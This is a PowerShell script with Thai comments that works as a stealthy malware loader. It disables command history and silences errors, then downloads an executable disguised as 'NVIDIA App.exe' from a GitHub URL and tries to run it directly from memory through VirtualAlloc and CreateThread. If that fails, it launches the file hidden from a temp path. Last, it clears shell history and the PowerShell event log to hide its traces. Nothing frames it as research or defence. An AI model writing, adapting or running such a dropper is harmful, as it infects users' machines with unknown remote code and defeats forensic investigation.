# ============================================
# 1. ปิดการบันทึกประวัติ
# ============================================
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ============================================
# 2. ดาวน์โหลด EXE เข้า RAM โดยตรง (ไม่เขียนไฟล์)
# ============================================
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
$bytes = $null

try {
    $response = Invoke-WebRequest -Uri $exeUrl -UseBasicParsing -UserAgent "Mozilla/5.0"
    $bytes = $response.Content
} catch {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $bytes = $wc.DownloadData($exeUrl)
    } catch {
        exit
    }
}

if (-not $bytes -or $bytes.Length -eq 0) { exit }

# ตรวจสอบ MZ Header
$header = [System.Text.Encoding]::ASCII.GetString($bytes, 0, 2)
if ($header -ne "MZ") { exit }

# ============================================
# 3. รัน EXE จาก RAM โดยใช้ VirtualAlloc + CreateThread
# ============================================
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeExec {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
}
"@ -ErrorAction SilentlyContinue

    $size = $bytes.Length
    $ptr = [NativeExec]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

    if ($ptr -ne [IntPtr]::Zero) {
        # คัดลอก byte ไปยังหน่วยความจำ
        [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $size)

        # สร้าง Thread เพื่อรัน
        $thread = [NativeExec]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

        if ($thread -ne [IntPtr]::Zero) {
            # รอให้ Thread ทำงาน (หรือไม่รอก็ได้ ถ้าต้องการให้ทำงานเบื้องหลัง)
            # [NativeExec]::WaitForSingleObject($thread, 0xFFFFFFFF) # ถ้าใส่จะรอจนจบ
        }

        # ปล่อยหน่วยความจำหลังจากรัน (หรือไม่ปล่อยก็ได้ ถ้าต้องการให้โปรแกรมทำงานต่อ)
        # [NativeExec]::VirtualFree($ptr, 0, 0x8000) # MEM_RELEASE
    }
} catch {
    # ถ้า Memory Execution ล้มเหลว ให้ fallback เป็นการรันจากไฟล์ชั่วคราว (แต่จะไม่ลบ ณ จุดนี้)
    try {
        $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
        [System.IO.File]::WriteAllBytes($tempPath, $bytes)
        $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
        # ไม่ลบไฟล์ทันที เพราะอาจจะถูกลบขณะกำลังทำงาน
        # แต่สามารถใช้ Scheduled Task ลบทีหลังได้
    } catch {}
}

# ============================================
# 4. ล้างร่องรอย (ไม่ลบไฟล์เพราะเราไม่ได้สร้างไฟล์)
# ============================================
Clear-History
wevtutil cl "Windows PowerShell" 2>$null
ipconfig /flushdns 2>$null

# ============================================
# 5. ปิดตัวเองอย่างเงียบ
# ============================================
$bytes = $null
[GC]::Collect()
[Environment]::Exit(0)
